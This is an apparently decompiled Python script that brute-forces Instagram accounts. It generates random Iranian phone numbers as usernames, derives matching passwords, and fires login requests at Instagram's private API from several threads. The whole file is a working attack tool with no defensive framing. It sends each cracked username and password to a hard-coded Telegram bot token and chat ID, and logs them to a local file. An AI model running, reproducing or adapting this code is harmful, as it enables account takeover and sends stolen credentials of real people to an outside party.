# uncompyle6 version 4.4.4
# Python bytecode 3.8
# Decompiled from: Python 3.9.6 (default, Jul 22 2022, 18:22:56) 
# [Clang 9.9.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: string
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from uuid import uuid4
import os
import uuid
from random import *
import string
from random import uniform, random, choice, sample

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')
from datetime import datetime
import time
import pyfiglet, os
from time import sleep
import webbrowser
Z = '\x1b[2;36m'
G = '\x1b[1;36m'
global zz,aa
sleep(0)
P55 = pyfiglet.figlet_format('4K')
print(G + P55)
sleep(3)
sleep(0)
bnar = pyfiglet.figlet_format('')
print(G + bnar)
sleep(1)

E = '\x1b[1;35m'
G = '\x1b[1;34m'
S = '\x1b[1;31m'
webbrowser.open(' ')
print(E + '[' + S + '!' + E + ']' + G + ' Iᗪ ᗷOT𐇭 ')
print('\n')
def find():
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        aa = 0
        zz = 0
        ID  =  '2021068735'
        tok = '2052387062:AAGO4ZwvpBMC_Q0Lu5OqmndYOsFfnrQjELY'
        print('\n')
        sleep(2)
        w = 'https://pastebin.com/raw/xPfV5eKD'
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'KEBO' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((choice(user) for i in range(7))))
            username = '+98990' + us
            password = '0990' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; NP; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=' 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 : {username}\n 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 : {password}\n"
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=[{zz}] \[{aa}]  ( {username} ) \n")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1

        print('')
        print('')
        print('')

for i in range(3):
    t1 = threading.Thread(target=find)
    t1.start()
